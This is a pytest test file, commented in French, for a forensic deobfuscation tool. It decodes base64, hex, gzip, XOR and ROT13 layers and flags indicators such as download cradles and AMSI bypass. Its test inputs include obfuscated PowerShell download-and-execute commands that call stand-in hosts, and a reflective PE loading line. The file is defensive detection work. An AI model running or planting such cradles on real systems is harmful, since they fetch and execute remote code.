"""Extension de desobfuscation statique (ext/deobfuscate.py) : chaque decodeur,
chaine multi-couches, indicateurs, plafonds et references citables."""

import base64
import gzip
import os
import time
import zlib

import pytest

_ROOT = os.path.join(os.path.dirname(__file__), '..', '..')

from phoenix_dfir_mcp import pathpolicy, toolkit  # noqa: E402
from phoenix_dfir_mcp.ext import deobfuscate as D  # noqa: E402

import build_network_ad_cases as B  # noqa: E402

FILELESS = os.path.join(_ROOT, 'eval', 'suite', 'fileless_powershell_memory', 'ws-compta-03_cmdline.csv')


@pytest.fixture(autouse=True)
def _isolation(monkeypatch):
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    toolkit.set_active_case(None)
    if 'deobfuscate_artifact' not in toolkit.INDEXED_TOOLS:
        monkeypatch.setattr(toolkit, 'INDEXED_TOOLS', toolkit.INDEXED_TOOLS + ('deobfuscate_artifact',))
    yield
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    toolkit.set_active_case(None)


def ops(text):
    r = D.deobfuscate(text)
    return r['operations'], r['decoded']


# ============================================================================
# Chaque decodeur
# ============================================================================

def test_base64_utf8_et_utf16le_encodedcommand():
    o, out = ops(base64.b64encode(b'Write-Output http://evil.example.com/x').decode())
    assert o == ['base64'] and 'http://evil.example.com/x' in out
    enc = base64.b64encode('Get-Process; IEX $x'.encode('utf-16-le')).decode()
    o, out = ops(f'powershell.exe -NoP -enc {enc}')
    assert o == ['base64', 'utf-16le'] and 'Get-Process; IEX $x' in out


@pytest.mark.parametrize('text,expected', [
    ('\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x61', 'http://a'),
    ('0x68,0x74,0x74,0x70,0x3a,0x2f', 'http:/'),
    ('687474703a2f2f6576696c2e636f6d', 'http://evil.com'),
])
def test_hex(text, expected):
    o, out = ops(text)
    assert o == ['hex'] and expected in out


def test_url_et_entites_html():
    assert ops('%68%74%74%70%3a%2f%2fx.example.com%2fa')[1] == 'http://x.example.com/a'
    assert ops('&#x68;&#x74;&#116;p://a.example.com &lt;b&gt;')[1] == 'http://a.example.com <b>'


@pytest.mark.parametrize('wbits,label', [(31, 'gzip'), (15, 'zlib')])
def test_gzip_zlib(wbits, label):
    c = zlib.compressobj(wbits=wbits)
    blob = c.compress(b'Invoke-WebRequest http://h.example.com/p') + c.flush()
    o, out = ops(f"[Convert]::FromBase64String('{base64.b64encode(blob).decode()}')")
    assert o == ['base64', label] and 'http://h.example.com/p' in out


def test_deflate_brut_avec_deflatestream():
    c = zlib.compressobj(wbits=-15)
    blob = c.compress(b'Start-Process calc.exe -WindowStyle Hidden') + c.flush()
    text = ("IEX (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream("
            f"[IO.MemoryStream][Convert]::FromBase64String('{base64.b64encode(blob).decode()}'),"
            "[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()")
    o, out = ops(text)
    assert o == ['base64', 'deflate'] and 'Start-Process calc.exe' in out


@pytest.mark.parametrize('text,expected', [
    ('[char]0x49+[char]69+[char]0x58', "'IEX'"),
    ('-join [char[]](104,116,116,112)', "'http'"),
    ('String.fromCharCode(0x68,116,116,112)', "'http'"),
    ('Chr(104) & Chr(116) & Chr(116) & Chr(112)', "'http'"),
])
def test_codes_de_caracteres(text, expected):
    o, out = ops(text)
    assert o[0] == 'char_codes' and out == expected


def test_inversion_concatenation_format_backticks():
    assert ops("'1sp.a/moc.elpmaxe.live//:ptth'")[1] == "'http://evil.example.com/a.ps1'"
    assert ops("$u = 'ht'+'tp:'+\"//x.example.com\"")[1] == "$u = 'http://x.example.com'"
    o, out = ops("(\"{2}{0}{1}\" -f 'ject','.Net','New-Ob')")
    assert o == ['format_operator'] and out == "'New-Object.Net'"
    o, out = ops('I`E`X (Ne`w-Ob`ject Net.WebClient)')
    assert o == ['backtick_removal'] and out == 'IEX (New-Object Net.WebClient)'


def test_xor_mono_octet_force_brute_et_cle_indiquee():
    clear = b"IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/p.ps1')"
    for key, ctx in ((0x37, ''), (0x5a, '$k=0x5a; $d | % { $_ -bxor $k }')):
        blob = base64.b64encode(bytes(b ^ key for b in clear)).decode()
        r = D.deobfuscate(f"{ctx} $d=[Convert]::FromBase64String('{blob}')")
        assert r['operations'][:2] == ['base64', 'xor']
        assert f'0x{key:02x}' in r['recipe'][1]['detail']
        assert 'http://10.1.2.3/p.ps1' in r['decoded']


def test_rot13():
    o, out = ops('cbjrefuryy -abc VRK (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat("uggc://k.rknzcyr.pbz")')
    assert o == ['rot13'] and 'http://x.example.com' in out


def test_texte_benin_inchange():
    for text in ('Get-ChildItem C:\\Users -Recurse | Select-Object Name',
                 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
                 'Le rapport mensuel est pret.'):
        r = D.deobfuscate(text)
        assert r['layers'] == 0 and r['decoded'] == text and not r['indicators']


def test_binaire_pe_signale_sans_execution():
    blob = base64.b64encode(b'MZ\x90\x00' + bytes(range(256)) * 2).decode()
    r = D.deobfuscate(f"[Reflection.Assembly]::Load([Convert]::FromBase64String('{blob}'))")
    assert r['embedded_binaries'][0]['type'] == 'pe'
    assert any(i['indicator'] == 'reflective_loading' for i in r['indicators'])


# ============================================================================
# Chaine multi-couches, indicateurs, IoCs
# ============================================================================

def test_chaine_quatre_couches_revele_le_c2():
    r = D.deobfuscate(B.fileless_command())
    assert r['operations'][:4] == ['base64', 'utf-16le', 'base64', 'gzip']
    assert {'format_operator', 'concatenation'} <= set(r['operations'])
    assert B.C2_URL in r['decoded']
    assert {'type': 'url', 'value': B.C2_URL} in r['iocs']
    found = {i['indicator'] for i in r['indicators']}
    assert {'download_cradle', 'amsi_bypass', 'reflective_loading', 'encoded_command', 'hidden_window'} <= found
    assert {'T1027', 'T1059.001', 'T1105', 'T1562.001', 'T1620'} <= set(r['mitre_techniques'])
    assert [s['step'] for s in r['recipe']] == list(range(1, len(r['recipe']) + 1))


def test_couches_imbriquees_url_base64_hex_reverse():
    inner = "'1sp.yap/moc.elpmaxe.2c//:ptth'"
    hexed = inner.encode().hex()
    b64 = base64.b64encode(hexed.encode()).decode()
    r = D.deobfuscate('%27' + b64.replace('=', '%3D') + '%27')
    assert r['operations'] == ['url_decode', 'base64', 'hex', 'reverse']
    assert 'http://c2.example.com/pay.ps1' in r['decoded']


# ============================================================================
# Plafonds
# ============================================================================

def test_entree_geante_tronquee_sans_blocage(monkeypatch):
    start = time.time()
    r = D.deobfuscate("'a'+" * 400000 + "'b'")
    assert r['truncated_input'] and time.time() - start < 15
    monkeypatch.setenv('PHOENIX_DEOBF_MAX_BYTES', '1000')
    r = D.deobfuscate('A' * 50000)
    assert r['truncated_input'] and r['input_length'] == 50000
    # bombe de decompression : sortie plafonnee
    bomb = base64.b64encode(gzip.compress(b'A' * 5_000_000, mtime=0)).decode()
    monkeypatch.setenv('PHOENIX_DEOBF_MAX_BYTES', str(1 << 16))
    r = D.deobfuscate(bomb)
    assert len(r['decoded']) <= D.MAX_OUTPUT


def test_profondeur_plafonnee():
    text = 'Write-Output ok'
    for _ in range(8):
        text = base64.b64encode(text.encode()).decode()
    r = D.deobfuscate(text, max_depth=3)
    assert r['layers'] == 3
    assert D.deobfuscate(text)['decoded'] == 'Write-Output ok'


# ============================================================================
# Outils, indexation, references
# ============================================================================

def test_outil_texte_et_erreurs():
    assert 'error' in toolkit.run_tool('deobfuscate_text', {'text': ''})
    r = toolkit.run_tool('deobfuscate_text', {'text': B.fileless_command()})
    assert B.C2_URL in r['decoded']


def test_artefact_csv_row_comme_parse_csv_et_refs(tmp_path):
    case = tmp_path / 'cas'
    case.mkdir()
    B.build_fileless(str(case))
    path = str(case / 'ws-compta-03_cmdline.csv')
    toolkit.set_active_case(str(case))
    r = toolkit.run_tool('deobfuscate_artifact', {'file_path': path})
    assert r['decoded_count'] == 1 and r['indexed_events'] == 1
    hit = r['decoded'][0]
    parsed = toolkit.run_tool('parse_csv', {'file_path': path})
    row = next(e for e in parsed['events'] if e['data']['PID'] == '4312')['row']
    assert hit['row'] == row and hit['line'] == row + 1
    assert any(i['value'] == B.C2_URL for i in r['iocs'])
    ok, bad = toolkit.validate_refs([{'artifact': 'ws-compta-03_cmdline.csv', 'kind': 'row', 'value': row},
                                     {'artifact': 'ws-compta-03_cmdline.csv', 'kind': 'pid', 'value': 4312}],
                                    str(case))
    assert len(ok) == 2 and not bad
    hits = toolkit.run_tool('search_evidence', {'case_dir': str(case), 'query': '194.58.112.77'})
    assert hits['total_matches'] >= 1


def test_artefact_plage_et_ligne(tmp_path):
    enc = base64.b64encode('IEX (iwr http://p.example.com/s)'.encode('utf-16-le')).decode()
    content = f'ligne 1\nligne 2\npowershell -enc {enc}\nfin\n'
    p = tmp_path / 'script.ps1'
    p.write_bytes(content.encode('utf-8'))  # LF on every OS: offsets are byte offsets
    off = content.index('powershell')
    r = toolkit.run_tool('deobfuscate_artifact', {'file_path': str(p), 'offset': off, 'length': 200})
    assert r['line'] == 3 and 'http://p.example.com/s' in r['decoded'] and r['events'][0]['line'] == 3
    r = toolkit.run_tool('deobfuscate_artifact', {'file_path': str(p), 'line': 3})
    assert r['decoded'][0]['line'] == 3
    assert D.applicable(str(p))[1] == ('desobfuscation', ('deobfuscate_artifact',))
    q = tmp_path / 'propre.ps1'
    q.write_text('Get-Date\n')
    assert D.applicable(str(q)) is None and D.applicable(str(tmp_path / 'x.evtx')) is None


def test_declarations():
    assert D.AGENT == ('network', 'Agent Reseau & Desobfuscation')
    assert set(D.READONLY) == {'deobfuscate_text', 'deobfuscate_artifact'}
    assert D.INDEXED == ('deobfuscate_artifact',)
    assert toolkit.agent_for('deobfuscate_text') == 'Agent Reseau & Desobfuscation'


def test_cas_fileless_livre():
    r = toolkit.run_tool('deobfuscate_artifact', {'file_path': FILELESS})
    assert any(i['value'] == B.C2_URL for i in r['iocs'])
